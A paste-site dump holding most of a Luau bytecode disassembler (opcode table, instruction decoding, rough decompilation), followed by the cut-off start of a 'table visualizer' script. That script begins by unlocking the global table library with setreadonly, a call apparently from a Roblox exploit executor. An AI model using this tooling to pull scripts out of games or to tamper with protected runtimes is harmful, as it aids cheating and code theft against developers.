		{ [""name""] = ""JUMPIFLT"", [""type""] = ""iAsBx"", [""case""] = 29, [""aux""] = true },
		{ [""name""] = ""JUMPIFNOTEQ"", [""type""] = ""iAsBx"", [""case""] = 30, [""aux""] = true },
		{ [""name""] = ""JUMPIFNOTLE"", [""type""] = ""iAsBx"", [""case""] = 31, [""aux""] = true },
		{ [""name""] = ""JUMPIFNOTLT"", [""type""] = ""iAsBx"", [""case""] = 32, [""aux""] = true },
		{ [""name""] = ""ADD"", [""type""] = ""iABC"", [""case""] = 33 },
		{ [""name""] = ""SUB"", [""type""] = ""iABC"", [""case""] = 34 },
		{ [""name""] = ""MUL"", [""type""] = ""iABC"", [""case""] = 35 },
		{ [""name""] = ""DIV"", [""type""] = ""iABC"", [""case""] = 36 },
		{ [""name""] = ""MOD"", [""type""] = ""iABC"", [""case""] = 37 },
		{ [""name""] = ""POW"", [""type""] = ""iABC"", [""case""] = 38 },
		{ [""name""] = ""ADDK"", [""type""] = ""iABC"", [""case""] = 39 },
		{ [""name""] = ""SUBK"", [""type""] = ""iABC"", [""case""] = 40 },
		{ [""name""] = ""MULK"", [""type""] = ""iABC"", [""case""] = 41 },
		{ [""name""] = ""DIVK"", [""type""] = ""iABC"", [""case""] = 42 },
		{ [""name""] = ""MODK"", [""type""] = ""iABC"", [""case""] = 43 },
		{ [""name""] = ""POWK"", [""type""] = ""iABC"", [""case""] = 44 },
		{ [""name""] = ""AND"", [""type""] = ""iABC"", [""case""] = 45 },
		{ [""name""] = ""OR"", [""type""] = ""iABC"", [""case""] = 46 },
		{ [""name""] = ""ANDK"", [""type""] = ""iABC"", [""case""] = 47 },
		{ [""name""] = ""ORK"", [""type""] = ""iABC"", [""case""] = 48 },
		{ [""name""] = ""CONCAT"", [""type""] = ""iABC"", [""case""] = 49 },
		{ [""name""] = ""NOT"", [""type""] = ""iAB"", [""case""] = 50 },
		{ [""name""] = ""MINUS"", [""type""] = ""iAB"", [""case""] = 51 },
		{ [""name""] = ""LENGTH"", [""type""] = ""iAB"", [""case""] = 52 },
		{ [""name""] = ""NEWTABLE"", [""type""] = ""iAB"", [""case""] = 53, [""aux""] = true },
		{ [""name""] = ""DUPTABLE"", [""type""] = ""iABx"", [""case""] = 54 },
		{ [""name""] = ""SETLIST"", [""type""] = ""iABC"", [""case""] = 55, [""aux""] = true },
		{ [""name""] = ""FORNPREP"", [""type""] = ""iABx"", [""case""] = 56 },
		{ [""name""] = ""FORNLOOP"", [""type""] = ""iABx"", [""case""] = 57 },
		{ [""name""] = ""FORGLOOP"", [""type""] = ""iABx"", [""case""] = 58, [""aux""] = true },
		{ [""name""] = ""FORGPREP_INEXT"", [""type""] = ""iA"", [""case""] = 59 },
		{ [""name""] = ""DEP_FORGLOOP_INEXT"", [""type""] = ""none"", [""case""] = 60 },
		{ [""name""] = ""FORGPREP_NEXT"", [""type""] = ""iA"", [""case""] = 61 },
		{ [""name""] = ""NATIVECALL"", [""type""] = ""none"", [""case""] = 62 },
		{ [""name""] = ""GETVARARGS"", [""type""] = ""iAB"", [""case""] = 63 },
		{ [""name""] = ""DUPCLOSURE"", [""type""] = ""iABx"", [""case""] = 64 },
		{ [""name""] = ""PREPVARARGS"", [""type""] = ""iA"", [""case""] = 65 },
		{ [""name""] = ""LOADKX"", [""type""] = ""iA"", [""case""] = 66, [""aux""] = true },
		{ [""name""] = ""JUMPX"", [""type""] = ""isAx"", [""case""] = 67 },
		{ [""name""] = ""FASTCALL"", [""type""] = ""iAC"", [""case""] = 68 },
		{ [""name""] = ""COVERAGE"", [""type""] = ""isAx"", [""case""] = 69 },
		{ [""name""] = ""CAPTURE"", [""type""] = ""iAB"", [""case""] = 70 },
		{ [""name""] = ""SUBRK"", [""type""] = ""iABC"", [""case""] = 71 },
		{ [""name""] = ""DIVRK"", [""type""] = ""iABC"", [""case""] = 72 },
		{ [""name""] = ""FASTCALL1"", [""type""] = ""iABC"", [""case""] = 73 },
		{ [""name""] = ""FASTCALL2"", [""type""] = ""iABC"", [""case""] = 74, [""aux""] = true },
		{ [""name""] = ""FASTCALL2K"", [""type""] = ""iABC"", [""case""] = 75, [""aux""] = true },
		{ [""name""] = ""FORGPREP"", [""type""] = ""iABx"", [""case""] = 76 },
		{ [""name""] = ""JUMPXEQKNIL"", [""type""] = ""iABx"", [""case""] = 77, [""aux""] = true },
		{ [""name""] = ""JUMPXEQKB"", [""type""] = ""iABx"", [""case""] = 78, [""aux""] = true },
		{ [""name""] = ""JUMPXEQKN"", [""type""] = ""iABx"", [""case""] = 79, [""aux""] = true },
		{ [""name""] = ""JUMPXEQKS"", [""type""] = ""iABx"", [""case""] = 80, [""aux""] = true },
		{ [""name""] = ""IDIV"", [""type""] = ""iABC"", [""case""] = 81 },
		{ [""name""] = ""IDIVK"", [""type""] = ""iABC"", [""case""] = 82 },
		{ [""name""] = ""COUNT"", [""type""] = ""none"", [""case""] = 83 }
	};
	for _, v in pairs(optable) do
		v.number = bit32.band(v.case*caseMultiplier, 0xff)
	end
	return optable
end

local luau = {};
luau.SIZE_A = 8
luau.SIZE_C = 8
luau.SIZE_B = 8
luau.SIZE_Bx = (luau.SIZE_C + luau.SIZE_B)
luau.SIZE_OP = 8
luau.POS_OP = 0
luau.POS_A = (luau.POS_OP + luau.SIZE_OP)
luau.POS_B = (luau.POS_A + luau.SIZE_A)
luau.POS_C = (luau.POS_B + luau.SIZE_B)
luau.POS_Bx = luau.POS_B
luau.MAXARG_A = (bit32.lshift(1, luau.SIZE_A) - 1)
luau.MAXARG_B = (bit32.lshift(1, luau.SIZE_B) - 1)
luau.MAXARG_C = (bit32.lshift(1, luau.SIZE_C) - 1)
luau.MAXARG_Bx = (bit32.lshift(1, luau.SIZE_Bx) - 1)
luau.MAXARG_sBx = bit32.rshift(luau.MAXARG_Bx, 1)
luau.BITRK = bit32.lshift(1, (luau.SIZE_B - 1))
luau.MAXINDEXRK = (luau.BITRK - 1)
luau.ISK = function(x) return bit32.band(x, luau.BITRK) end
luau.INDEXK = function(x) return bit32.band(x, bit32.bnot(luau.BITRK)) end
luau.RKASK = function(x) return bit32.bor(x, luau.BITRK) end
luau.MASK1 = function(n,p) return bit32.lshift(bit32.bnot(bit32.lshift(bit32.bnot(0), n)), p) end
luau.MASK0 = function(n,p) return bit32.bnot(luau.MASK1(n, p)) end
luau.GETARG_A = function(i) return bit32.band(bit32.rshift(i, luau.POS_A), luau.MASK1(luau.SIZE_A, 0)) end
luau.GETARG_B = function(i) return bit32.band(bit32.rshift(i, luau.POS_B), luau.MASK1(luau.SIZE_B, 0)) end
luau.GETARG_C = function(i) return bit32.band(bit32.rshift(i, luau.POS_C), luau.MASK1(luau.SIZE_C, 0)) end
luau.GETARG_Bx = function(i) return bit32.band(bit32.rshift(i, luau.POS_Bx), luau.MASK1(luau.SIZE_Bx, 0)) end
luau.GETARG_sBx = function(i) local Bx = luau.GETARG_Bx(i) local sBx = Bx + 1; if Bx > 0x7FFF and Bx <= 0xFFFF then sBx = -(0xFFFF - Bx); sBx = sBx - 1; end return sBx end
luau.GETARG_sAx = function(i) return bit32.rshift(i, 8) end
luau.GET_OPCODE = function(i) return bit32.band(bit32.rshift(i, luau.POS_OP), luau.MASK1(luau.SIZE_OP, 0)) end

local function disassemble(a1, showOps)
	if type(a1) ~= ""string"" then
		error(""give string!!!"", 2)
	end

	local output = """"
	local mainProto, protoTable, stringTable = deserialize(a1)
	local luauOpTable = getluauoptable();

	local function getOpCode(opName)
		for _,v in pairs(luauOpTable) do 
			if v.name == opName then 
				return v.number;
			end
		end
		return 0;
	end

	mainProto.source = ""main""

	local function readProto(proto, depth)
		local output = """";

		local function addTabSpace(depth)
			output = output .. string.rep(""    "", depth)
		end

		-- using function name (this will be removed & done outside of readProto)
		if proto.source then
			output = output .. string.format(""function %s("", proto.source)
		else
			output = output .. ""function(""
		end

		for i = 1,proto.numParams do
			output = output .. ""arg"" .. (i - 1) -- args coincide with stack index
			if i < proto.numParams then
				output = output .. "", ""
			end
		end

		if proto.isVarArg ~= 0 then
			if proto.numParams > 0 then
				output = output .. "", ""
			end
			output = output .. ""...""
		end

		output = output .. "") "" .. ""-- line "" .. proto.lineDefined .. ""\n""

		depth = depth + 1

		for i = 1,proto.numParams do
			addTabSpace(depth);
			output = output .. string.format(""local var%i = arg%i\n"", i - 1, i - 1);
		end

		local refData = {}
		local nameCall = nil
		local markedAux = false
		local codeIndex = 1
		while codeIndex < proto.sizeCode do
			local i = proto.codeTable[codeIndex]
			local opc = luau.GET_OPCODE(i)
			local A = luau.GETARG_A(i)
			local B = luau.GETARG_B(i)
			local Bx = luau.GETARG_Bx(i)
			local C = luau.GETARG_C(i)
			local sBx = luau.GETARG_sBx(i)
			local sAx = luau.GETARG_sAx(i)
			local aux = proto.codeTable[codeIndex + 1]

			if markedAux then
				markedAux = false
			else
				addTabSpace(depth);

				local opinfo;

				for _,v in pairs(luauOpTable) do 
					if v.number == opc then 
						opinfo = v
						break;
					end
				end

				output = output .. tostring(codeIndex) .. "".   "" 

				if showOps and opinfo then
					local str = opinfo.name .. string.rep("" "", 16 - string.len(opinfo.name))

					if opinfo.type == ""iA"" then
						str = str .. string.format(""%i"", A)
					elseif opinfo.type == ""iAB"" then
						str = str .. string.format(""%i %i"", A, B)
					elseif opinfo.type == ""iAC"" then
						str = str .. string.format(""%i %i"", A, C)
					elseif opinfo.type == ""iABx"" then
						str = str .. string.format(""%i %i"", A, Bx)
					elseif opinfo.type == ""iAsBx"" then
						str = str .. string.format(""%i %i"", A, sBx)
					elseif opinfo.type == ""isBx"" then
						str = str .. string.format(""%i"", sBx)
					elseif opinfo.type == ""iABC"" then
						str = str .. string.format(""%i %i %i"", A, B, C)
					end

					if opinfo.aux then
						str = str .. "" [aux]"";
						markedAux = true
					end

					output = output .. str .. string.rep("" "", 40 - string.len(str))
				else
					if opinfo and opinfo.aux then
						markedAux = true;
					end
				end

				-- continue with disassembly (rough decompilation -- no scope/flow control)
				-- 
				local varsDefined = {};

				local function defineVar(index, name)
					table.insert(varsDefined, { [""name""] = name, [""stackIndex""] = index });
				end

				local function isVarDefined(index)
					return true;
                    --[[for _,v in pairs(varsDefined) do
                        if v.stackIndex == index then
                            return true
                        end
                    end
                    return false;
                    ]]
				end

				local function addReference(refStart, refEnd)
					for _,v in pairs(refData) do
						if v.codeIndex == refEnd then
							table.insert(v.refs, refStart);
							return;
						end
					end
					table.insert(refData, { [""codeIndex""] = refEnd, [""refs""] = { refStart } });
				end

				local nilValue = { [""type""] = ""nil"", [""value""] = ""nil"" }

				if opc == getOpCode(""LOADNIL"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = nil"", A)
				elseif opc == getOpCode(""BREAK"") then
					output = output .. ""break""
				elseif opc == getOpCode(""LOADK"") then
					local k = proto.kTable[Bx + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s"", A, (type(k.value) == ""string"") and (""\"""" .. k.value .. ""\"""") or tostring(k.value))
				elseif opc == getOpCode(""LOADKX"") then
					local k = proto.kTable[aux + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s"", A, (type(k.value) == ""string"") and (""\"""" .. k.value .. ""\"""") or tostring(k.value))
				elseif opc == getOpCode(""LOADB"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s"", A, tostring(B == 1))
				elseif opc == getOpCode(""LOADN"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s"", A, tostring(Bx))
				elseif opc == getOpCode(""GETUPVAL"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = upvalues[%i]"", A, B)
				elseif opc == getOpCode(""SETUPVAL"") then
					output = output .. string.format(""upvalues[%i] = var%i"", B, A)
				elseif opc == getOpCode(""MOVE"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i"", A, B)
				elseif opc == getOpCode(""LENGTH"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = #var%i"", A, B)
				elseif opc == getOpCode(""MINUS"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = -var%i"", A, B)
				elseif opc == getOpCode(""NOT"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = not var%i"", A, B)
				elseif opc == getOpCode(""GETVARARGS"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = ..."", A)
				elseif opc == getOpCode(""CONCAT"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i .. var%i"", A, B, C)
				elseif opc == getOpCode(""AND"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i and var%i"", A, B, C)
				elseif opc == getOpCode(""OR"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i or var%i"", A, B, C)
				elseif opc == getOpCode(""ANDK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i and %s"", A, B, tostring(k.value))
				elseif opc == getOpCode(""ORK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i or %s"", A, B, tostring(k.value))
				elseif opc == getOpCode(""FASTCALL"") then
					output = output .. string.format(""FASTCALL[id=%i]()"", A);
				elseif opc == getOpCode(""FASTCALL1"") then
					output = output .. string.format(""FASTCALL[id=%i](%i)"", A, B);
				elseif opc == getOpCode(""FASTCALL2"") then
					output = output .. string.format(""FASTCALL[id=%i](%i, %i)"", A, B, aux);
				elseif opc == getOpCode(""FASTCALL2K"") then
					local k = proto.kTable[aux + 1] or nilValue;
					output = output .. string.format(""FASTCALL[id=%i](%i, %i)"", A, B, tostring(k.value));
				elseif opc == getOpCode(""GETIMPORT"") then
					local indexCount = bit32.band(bit32.rshift(aux, 30), 0x3FF) -- 0x40000000 --> 1, 0x80000000 --> 2
					local cacheIndex1 = bit32.band(bit32.rshift(aux, 20), 0x3FF)
					local cacheIndex2 = bit32.band(bit32.rshift(aux, 10), 0x3FF)
					local cacheIndex3 = bit32.band(bit32.rshift(aux, 0), 0x3FF)

					if indexCount == 1 then
						local k1 = proto.kTable[cacheIndex1 + 1];

						output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s"", A, tostring(k1.value))
					elseif indexCount == 2 then
						local k1 = proto.kTable[cacheIndex1 + 1];
						local k2 = proto.kTable[cacheIndex2 + 1];

						output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s[\""%s\""]"", A, k1.value, tostring(k2.value))
					elseif indexCount == 3 then
						local k1 = proto.kTable[cacheIndex1 + 1];
						local k2 = proto.kTable[cacheIndex2 + 1];
						local k3 = proto.kTable[cacheIndex3 + 1];

						output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s[\""%s\""][\""%s\""]"", A, k1.value, tostring(k2.value), tostring(k3.value))
					else
						error(""[GETIMPORT] Too many entries"");
					end
				elseif opc == getOpCode(""GETGLOBAL"") then
					local k = proto.kTable[aux + 1] or nilValue;
					output = output .. string.format(""var%i = %s"", A, tostring(k.value))
				elseif opc == getOpCode(""SETGLOBAL"") then
					local k = proto.kTable[aux + 1] or nilValue;
					output = output .. string.format(""%s = var%i"", tostring(k.value), A)
				elseif opc == getOpCode(""GETTABLE"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i[var%i]"", A, B, C)
				elseif opc == getOpCode(""SETTABLE"") then
					output = output .. string.format(""var%i[var%i] = var%i"", B, C, A)
				elseif opc == getOpCode(""GETTABLEN"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i[%i]"", A, B, C - 1)
				elseif opc == getOpCode(""SETTABLEN"") then
					output = output .. string.format(""var%i[%i] = var%i"", B, C - 1, A)
				elseif opc == getOpCode(""GETTABLEKS"") then
					local k = proto.kTable[aux + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i[%s]"", A, B, (type(k.value) == ""string"") and (""\"""" .. k.value .. ""\"""") or tostring(k.value))
				elseif opc == getOpCode(""SETTABLEKS"") then
					local k = proto.kTable[aux + 1] or nilValue;
					output = output .. string.format(""var%i[%s] = var%i"", B, (type(k.value) == ""string"") and (""\"""" .. k.value .. ""\"""") or tostring(k.value), A)
				elseif opc == getOpCode(""NAMECALL"") then
					local k = proto.kTable[aux + 1] or nilValue;
					nameCall = string.format(""var%i:%s"", B, tostring(k.value))
					markedAux = true;
				elseif opc == getOpCode(""FORNPREP"") then
					output = output .. string.format(""FORNPREP start - [escape at #%i]"", (codeIndex + sBx) + 1);
				elseif opc == getOpCode(""FORNLOOP"") then
					output = output .. string.format(""FORNLOOP end - iterate + goto #%i"", codeIndex + sBx);
				elseif opc == getOpCode(""FORGPREP"") then
					output = output .. string.format(""FORGPREP start - [escape at #%i] -- iterator: var%i"", (codeIndex + sBx) + 1, A + 3);
				elseif opc == getOpCode(""FORGLOOP"") then
					local ipairsStyleTraversal = bit32.rshift(aux, 31) == 1
					output = output .. string.format(""FORGLOOP - iterate + goto #%i"", codeIndex + sBx) .. (ipairsStyleTraversal and "" (ipairs)"" or """");
				elseif opc == getOpCode(""FORGPREP_INEXT"") or opc == getOpCode(""DEP_FORGLOOP_INEXT"") then
					output = output .. string.format(""FORGPREP_INEXT start - [escape at #%i] -- iterator: ipairs"", (codeIndex + sBx) + 1);
				elseif opc == getOpCode(""FORGPREP_NEXT"") then
					output = output .. string.format(""FORGPREP_NEXT start - [escape at #%i] -- iterator: pairs"", (codeIndex + sBx) + 1);
				elseif opc == getOpCode(""JUMP"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i"", codeIndex + sBx);
				elseif opc == getOpCode(""JUMPBACK"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""[BACK] goto #%i -- might be a repeating loop"", codeIndex + sBx);
				elseif opc == getOpCode(""JUMPIF"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if var%i"", codeIndex + sBx, A);
				elseif opc == getOpCode(""JUMPIFNOT"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if not var%i"", codeIndex + sBx, A);
				elseif opc == getOpCode(""JUMPX"") then
					addReference(codeIndex, codeIndex + sAx);
					output = output .. string.format(""goto #%i [X]"", codeIndex + sAx);
				elseif opc == getOpCode(""JUMPIFEQ"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if var%i == var%i"", codeIndex + sBx, A, aux);
				elseif opc == getOpCode(""JUMPIFNOTEQ"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if var%i ~= var%i"", codeIndex + sBx, A, aux);
				elseif opc == getOpCode(""JUMPIFLE"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if var%i >= var%i"", codeIndex + sBx, aux, A);
				elseif opc == getOpCode(""JUMPIFNOTLE"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if var%i < var%i"", codeIndex + sBx, aux, A);
				elseif opc == getOpCode(""JUMPIFLT"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if var%i > var%i"", codeIndex + sBx, aux, A);
				elseif opc == getOpCode(""JUMPIFNOTLT"") then
					addReference(codeIndex, codeIndex + sBx);
					output = output .. string.format(""goto #%i if var%i <= var%i"", codeIndex + sBx, aux, A);
				elseif opc == getOpCode(""JUMPXEQKNIL"") then
					addReference(codeIndex, codeIndex + sBx);
					local v = if bit32.rshift(aux, 31) == 1 then ""=="" else ""~=""
					output = output .. string.format(""goto #%i if var%i %s nil"", codeIndex + sBx, A, v);
				elseif opc == getOpCode(""JUMPXEQKB"") then
					addReference(codeIndex, codeIndex + sBx);
					local v = if bit32.rshift(aux, 31) == 1 then ""=="" else ""~=""
					local b = if bit32.band(aux, 1) == 1 then true else false
					output = output .. string.format(""goto #%i if var%i %s %s"", codeIndex + sBx, A, v, tostring(b));
				elseif opc == getOpCode(""JUMPXEQKN"") or opc == getOpCode(""JUMPXEQKS"") then
					addReference(codeIndex, codeIndex + sBx);
					local v = if bit32.rshift(aux, 31) == 1 then ""=="" else ""~=""
					local k = proto.kTable[bit32.band(aux, 0xFFFFFF)] or nilValue;
					output = output .. string.format(""goto #%i if var%i %s %s"", codeIndex + sBx, A, v, tostring(k.value));
				elseif opc == getOpCode(""ADD"") then
					output = output .. string.format(""var%i = var%i + var%i"", A, B, C);
				elseif opc == getOpCode(""ADDK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i + %s"", A, B, tostring(k.value));
				elseif opc == getOpCode(""SUB"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i - var%i"", A, B, C);
				elseif opc == getOpCode(""SUBK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i - %s"", A, B, tostring(k.value));
				elseif opc == getOpCode(""MUL"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i * var%i"", A, B, C);
				elseif opc == getOpCode(""MULK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i * %s"", A, B, tostring(k.value));
				elseif opc == getOpCode(""DIV"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i / var%i"", A, B, C);
				elseif opc == getOpCode(""DIVK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i / %s"", A, B, tostring(k.value));
				elseif opc == getOpCode(""MOD"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i %% var%i"", A, B, C);
				elseif opc == getOpCode(""MODK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i %% %s"", A, B, tostring(k.value));
				elseif opc == getOpCode(""POW"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i ^ var%i"", A, B, C);
				elseif opc == getOpCode(""POWK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i ^ %s"", A, B, tostring(k.value));
				elseif opc == getOpCode(""CALL"") then
					if C > 1 then
						for j = 1, C - 1 do
							output = output .. string.format(""var%i"", A + j - 1)
							if j < C - 1 then output = output .. "", "" end
						end
						output = output .. "" = ""
					elseif C == 0 then
						output = output .. string.format(""var%i, ..."", A);
						output = output .. "" = ""
					end
					if nameCall then
						output = output .. nameCall .. ""("";
					else
						output = output .. string.format(""var%i("", A)
					end
					if B > 1 then
						if nameCall then
							for j = 1, B - 2 do
								output = output .. string.format(""var%i"", A + 1 + j) -- exclude self
								if j < B - 2 then output = output .. "", "" end
							end
						else
							for j = 1, B - 1 do
								output = output .. string.format(""var%i"", A + j)
								if j < B - 1 then output = output .. "", "" end
							end
						end
					elseif B == 0 then
						output = output .. string.format(""var%i, ..."", A + 1);
					end
					nameCall = nil;
					output = output .. "")"";
				elseif opc == getOpCode(""NATIVECALL"") then
					output = output .. ""NATIVECALL()"";
				elseif opc == getOpCode(""NEWTABLE"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = {}"", A)
				elseif opc == getOpCode(""DUPTABLE"") then
					local t = proto.kTable[Bx + 1].value;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = { "", A)
					for j = 1,t.size do
						local id = t.ids[j];
						local k = proto.kTable[id];
						output = output .. ((type(k.value) == ""string"") and (""\"""" .. k.value .. ""\"""") or tostring(k.value))
						if j < t.size then
							output = output .. "", "";
						end
					end
					output = output .. ""}"";
				elseif opc == getOpCode(""SETLIST"") then
					local fieldSize = aux;
					output = output .. ""\n""
					for j = 1, C do
						addTabSpace(depth);
						output = output .. string.format(""var%i[%i] = var%i\n"", A, j + fieldSize - 1, B + j - 1);
					end
				elseif opc == getOpCode(""COVERAGE"") then
					output = output .. ""COVERAGE\n""
				elseif opc == getOpCode(""CAPTURE"") then
					markedAux = true;
					local captureType = """"
					if A == 1 then
						captureType = ""UPVAL""
					elseif A == 2 then
						captureType = ""REF""
					elseif A == 3 then
						captureType = ""VAL""
					end
					output = output .. string.format(""CAPTURE %s %c%d\n"", captureType, if captureType == ""UPVAL"" then ""U"" else ""R"", B)
				elseif opc == getOpCode(""SUBRK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s - var%i"", A, tostring(k.value), B);
				elseif opc == getOpCode(""DIVRK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = %s / var%i"", A, tostring(k.value), B);
				elseif opc == getOpCode(""NEWCLOSURE"") then
					output = output .. ""\n""

					local nCaptures = 0;
					for j = codeIndex + 1, proto.sizeCode do
						if luau.GET_OPCODE(proto.codeTable[j]) ~= getOpCode(""CAPTURE"") then
							break
						else
							local upvalueIndex = j - codeIndex - 1;
							local captureType = luau.GETARG_A(proto.codeTable[j]);
							local captureIndex = luau.GETARG_Bx(proto.codeTable[j]);

							nCaptures = nCaptures + 1;

							addTabSpace(depth);
							if captureType == 0 or captureType == 1 then
								output = output .. string.format(""-- V nested upvalues[%i] = var%i\n"", upvalueIndex, captureIndex)
							elseif captureType == 2 then
								output = output .. string.format(""-- V nested upvalues[%i] = upvalues[%i]\n"", upvalueIndex, captureIndex)
							else
								error(""[NEWCLOSURE] Invalid capture type"");
							end
						end
					end
					codeIndex = codeIndex + nCaptures;

					addTabSpace(depth);
					local nextProto = proto.pTable[Bx + 1]
					if nextProto.source then
						output = output .. readProto(nextProto, depth)
						addTabSpace(depth);
						output = output .. string.format(""var%i = "", A) .. nextProto.source
					else
						nextProto.source = nil;
						output = output .. string.format(""var%i = "", A) .. readProto(nextProto, depth)
					end
				elseif opc == getOpCode(""DUPCLOSURE"") then
					output = output .. ""\n""

					local nCaptures = 0;
					for j = codeIndex + 1, proto.sizeCode do
						if luau.GET_OPCODE(proto.codeTable[j]) ~= getOpCode(""CAPTURE"") then
							break
						else
							local upvalueIndex = j - codeIndex - 1;
							local captureType = luau.GETARG_A(proto.codeTable[j]);
							local captureIndex = luau.GETARG_Bx(proto.codeTable[j]);

							nCaptures = nCaptures + 1;

							addTabSpace(depth);
							if captureType == 0 or captureType == 1 then
								output = output .. string.format(""-- V nested upvalues[%i] = var%i\n"", upvalueIndex, captureIndex)
							elseif captureType == 2 then
								output = output .. string.format(""-- V nested upvalues[%i] = upvalues[%i]\n"", upvalueIndex, captureIndex)
							else
								error(""[DUPCLOSURE] Invalid capture type"");
							end
						end
					end
					codeIndex = codeIndex + nCaptures;

					addTabSpace(depth);
					local nextProto = protoTable[proto.kTable[Bx + 1].value]
					if nextProto.source then
						output = output .. readProto(nextProto, depth)
						addTabSpace(depth);
						output = output .. string.format(""var%i = "", A) .. nextProto.source
					else
						nextProto.source = nil;
						output = output .. string.format(""var%i = "", A) .. readProto(nextProto, depth)
					end
				elseif opc == getOpCode(""RETURN"") then
					if B > 1 then
						output = output .. ""return "";
						for j = 1, B - 1 do
							output = output .. string.format(""var%i"", A + j)
							if j < B - 1 then output = output .. "", "" end
						end
					elseif B == 0 then
						output = output .. string.format(""var%i, ..."", A)
					end
				elseif opc == getOpCode(""IDIV"") then
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i // var%i"", A, B, C);
				elseif opc == getOpCode(""IDIVK"") then
					local k = proto.kTable[C + 1] or nilValue;
					output = output .. (isVarDefined(A) and """" or ""local "") .. string.format(""var%i = var%i // %s"", A, B, tostring(k.value));
				end

				for _,v in pairs(refData) do
					if v.codeIndex == codeIndex then
						output = output .. "" -- referenced by ""
						for j = 1,#v.refs do
							output = output .. ""#"" .. v.refs[j]
							if j < #v.refs then
								output = output .. "", ""
							end
						end
					end
				end

				output = output .. ""\n""
			end

			codeIndex = codeIndex + 1
		end

		depth = depth - 1

		addTabSpace(depth)
		output = output .. ""end\n""
		return output;
	end

	local startDepth = 0;
	output = output .. readProto(mainProto, startDepth)

	return output
end

function deco(passedBytecode)
--[[passedBytecode = string.gsub(passedBytecode, ""\\%d+"", function(x)
	return string.char(tonumber(string.sub(x,2)))
end)]]
return disassemble(passedBytecode)
end
return deco"
qhjbQDEs,table visualizer,HTDBarsi,Lua,Sunday 18th of February 2024 03:29:14 PM CDT,"setreadonly(table,false)
local types = {
    [""nil""] = function(x) return ""nil"" end,
    [""boolean""] = function(x) return x and ""true"" or ""false"" end,
    [""number""] = function(x) return tostring(x) end,
    [""string""] = function(x) return ""\""""..x..""\"""" end,
    [""function""] = function(x) return tostring(x) end,
    [""userdata""] = function(x) if typeof(x) == ""Instance"" then return x:GetFullName() else return typeof(x).."".new(""..tostring(x).."")"" end end,
    [""thread""] = function(x) return tostring(x) end,
    [""table""] = function(x) return tostring(x) end
}

function format(x)
    return types[type(x)](x)
end

table.visualize = function(tbl,idx)
    if not idx then idx = 0 end
    if idx == 100 then return ""[1] = nil"" end
    local re = {}
    for i,v in pairs(tbl) do 
        table.insert(re,string.rep(""\t"",idx)..""[""..format(i)..""] = ""..format(v).."" (""..type(v).."")\n"")
        if type(v) == ""table"" then 
